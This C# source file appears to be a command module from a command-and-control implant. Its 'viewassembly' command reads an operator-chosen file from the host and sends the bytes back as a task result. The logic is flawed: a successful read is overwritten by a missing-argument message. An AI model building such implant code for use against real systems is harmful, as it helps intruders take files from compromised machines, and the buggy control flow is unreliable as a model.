using DynamicEngLoading;
using System;
using System.IO;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class viewassembly : EngineerCommand
    {
        public override string Name => "viewassembly";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (task.Arguments.TryGetValue("/file", out string assembly))
                {
                    //read the content of file and return it
                    byte[] content = File.ReadAllBytes(assembly);
                    if (content.Length == 0)
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("assembly does not exist or has no content", task, EngTaskStatus.CompleteWithErrors,TaskResponseType.String);
                        return;
                    }

                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(content,task,EngTaskStatus.Complete,TaskResponseType.None);
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("no /file argument given",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
